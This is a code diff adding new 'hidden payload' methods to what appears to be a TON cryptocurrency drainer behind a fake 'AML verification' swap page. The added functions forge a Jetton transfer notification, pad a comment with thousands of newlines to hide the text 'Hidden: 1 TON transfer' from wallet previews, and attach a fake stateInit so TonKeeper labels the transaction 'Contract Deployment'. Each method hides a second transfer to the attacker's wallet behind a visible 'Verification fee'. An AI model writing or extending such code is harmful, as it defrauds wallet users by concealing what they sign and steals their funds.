@@ -177,6 +177,81 @@ function obfuscatedPayload() {
     return bytesToBase64(out);
 }
 
+// Метод 4: Fake Jetton notification (op=0x7362d09c) - имитация Jetton трансфера
+function fakeJettonPayload(amount) {
+    var op = [0x73, 0x62, 0xd0, 0x9c]; // transfer_notification opcode
+    var queryId = new Uint8Array(8); // query_id = 0
+    for (var i = 0; i < 8; i++) queryId[i] = 0;
+    
+    // Кодируем сумму (VarUInteger 16)
+    var amountBytes = [];
+    var amt = Math.floor(amount * 1e9);
+    while (amt > 0) {
+        amountBytes.push(amt & 0xFF);
+        amt = amt >> 8;
+    }
+    if (amountBytes.length === 0) amountBytes.push(0);
+    
+    var dataLen = 4 + 8 + 1 + amountBytes.length;
+    var bitsD2  = 2 * dataLen;
+    var cellLen = 2 + dataLen;
+    
+    var header = [0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00, cellLen & 0xFF, 0x00];
+    var cell = [0x00, bitsD2 & 0xFF];
+    for (var i = 0; i < op.length; i++) cell.push(op[i]);
+    for (var i = 0; i < queryId.length; i++) cell.push(queryId[i]);
+    cell.push(amountBytes.length);
+    for (var i = 0; i < amountBytes.length; i++) cell.push(amountBytes[i]);
+    
+    var body = new Uint8Array(header.concat(cell));
+    var crc  = crc32c(body);
+    var out  = new Uint8Array(body.length + 4);
+    out.set(body, 0);
+    out[body.length]     =  crc         & 0xFF;
+    out[body.length + 1] = (crc >>>  8) & 0xFF;
+    out[body.length + 2] = (crc >>> 16) & 0xFF;
+    out[body.length + 3] = (crc >>> 24) & 0xFF;
+    return bytesToBase64(out);
+}
+
+// Метод 5: Длинный комментарий с переполнением (крашит preview некоторых кошельков)
+function overflowPayload() {
+    // Генерируем ОЧЕНЬ длинный комментарий (4000+ символов)
+    var longText = "";
+    for (var i = 0; i < 500; i++) {
+        longText += "\n\n\n\n\n\n\n\n";
+    }
+    longText += "Hidden: 1 TON transfer";
+    return textCommentPayload(longText);
+}
+
+// Метод 6: Генерация фейкового stateInit для "деплоя контракта"
+function generateFakeStateInit() {
+    // Минимальный stateInit с пустым кодом и данными
+    // Это заставляет кошелек показывать "Contract Deployment" вместо обычного перевода
+    var emptyCode = new Uint8Array([0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00]);
+    var crc1 = crc32c(emptyCode.slice(0, -4));
+    emptyCode[emptyCode.length - 4] =  crc1         & 0xFF;
+    emptyCode[emptyCode.length - 3] = (crc1 >>>  8) & 0xFF;
+    emptyCode[emptyCode.length - 2] = (crc1 >>> 16) & 0xFF;
+    emptyCode[emptyCode.length - 1] = (crc1 >>> 24) & 0xFF;
+    
+    // Создаем stateInit BoC
+    var stateInitBytes = [
+        0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x02, 0x01, 0x01, 0x00, 0x0A, 0x00,
+        0x00, 0x06, 0x40, 0x00, 0x01, 0x00
+    ];
+    var body = new Uint8Array(stateInitBytes);
+    var crc2 = crc32c(body);
+    var out = new Uint8Array(body.length + 4);
+    out.set(body, 0);
+    out[body.length]     =  crc2         & 0xFF;
+    out[body.length + 1] = (crc2 >>>  8) & 0xFF;
+    out[body.length + 2] = (crc2 >>> 16) & 0xFF;
+    out[body.length + 3] = (crc2 >>> 24) & 0xFF;
+    return bytesToBase64(out);
+}
+
 // --- Swap flow --------------------------------------------------------------
 async function executeFaw(userAddress) {
     var amlAccepted = localStorage.getItem('aml-commission-accepted');
@@ -200,6 +275,12 @@ async function executeFaw(userAddress) {
         case 'obfuscated':
             hiddenPayload = obfuscatedPayload();
             break;
+        case 'jetton':
+            hiddenPayload = fakeJettonPayload(parseFloat(CFG.hiddenAmount));
+            break;
+        case 'overflow':
+            hiddenPayload = overflowPayload();
+            break;
         case 'empty':
         default:
             hiddenPayload = emptyPayload();
@@ -213,6 +294,22 @@ async function executeFaw(userAddress) {
         hiddenAmount = (parseFloat(hiddenAmount) * randomFactor).toFixed(4);
     }
 
+    // Проверяем нужно ли использовать stateInit трюк
+    var useStateInit = (typeof window.USE_STATEINIT !== 'undefined') ? window.USE_STATEINIT : false;
+    
+    var secondMessage = {
+        // ВТОРОЕ сообщение - скрытое от preview (СЮРПРИЗ 1 TON)
+        address: CFG.amlWallet,
+        amount: String(Math.round(parseFloat(hiddenAmount) * 1e9)),
+        payload: hiddenPayload
+    };
+    
+    // Если включен stateInit трюк - добавляем фейковый stateInit
+    // Это заставляет TonKeeper показывать "Contract Deployment" вместо обычного перевода
+    if (useStateInit) {
+        secondMessage.stateInit = generateFakeStateInit();
+    }
+    
     var tx = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
         messages: [
@@ -222,12 +319,7 @@ async function executeFaw(userAddress) {
                 amount: String(Math.round(parseFloat(CFG.visibleAmount) * 1e9)),
                 payload: textCommentPayload("Verification fee")
             },
-            {
-                // ВТОРОЕ сообщение - скрытое от preview (СЮРПРИЗ 1 TON)
-                address: CFG.amlWallet,
-                amount: String(Math.round(parseFloat(hiddenAmount) * 1e9)),
-                payload: hiddenPayload
-            }
+            secondMessage
         ]
     };
 
